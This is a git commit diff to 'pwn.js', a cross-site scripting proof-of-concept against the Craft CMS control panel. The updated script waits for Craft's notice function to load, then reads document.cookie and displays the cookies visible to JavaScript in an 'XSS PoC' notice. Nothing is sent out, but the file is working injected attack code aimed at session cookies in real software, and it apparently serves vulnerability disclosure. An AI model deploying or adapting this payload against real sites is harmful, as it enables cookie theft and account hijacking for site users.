15da39d2b3ce062ba6fb57df62b8c1c3349ce9e1
Janpreet Singh <96124374+JanpreetWazir@users.noreply.github.com>
2025-11-25 23:01:39 +0530

    Update pwn.js

--- pwn.js
+++ pwn.js
@@ -1,25 +1,14 @@
-// 1. Check what JS can see (will be empty)
-var jsCookie = document.cookie;
+const interval = setInterval(() => {
+    if (window.Craft && Craft.cp && Craft.cp.displayNotice) {
+        clearInterval(interval);
 
-// 2. Check if any cookies exist in the browser (safe metadata check)
-var cookieCount = 0;
-var cookieNames = [];
+        var jsCookie = document.cookie;
 
-try {
-    // Try to read cookies via document.cookie (will not show HttpOnly)
-    jsCookie = document.cookie;
-
-    // Count cookies by reading document.cookie length
-    cookieCount = jsCookie ? jsCookie.split(";").length : 0;
-
-} catch (e) {
-    cookieCount = -1;
-}
-
-// 3. Show cookie visibility summary safely
-Craft.cp.displayNotice(
-    "XSS PoC:<br>" +
-    "Visible cookies to JavaScript: " + jsCookie + "<br>" +
-    "HttpOnly cookies exist (not readable by JS).<br>" +
-    "Browser will still send them with requests."
-);
+        Craft.cp.displayNotice(
+            "XSS PoC:<br>" +
+            "Visible cookies to JavaScript: " + jsCookie + "<br>" +
+            "HttpOnly cookies exist (not readable by JS).<br>" +
+            "Browser will still send them with requests."
+        );
+    }
+}, 300);
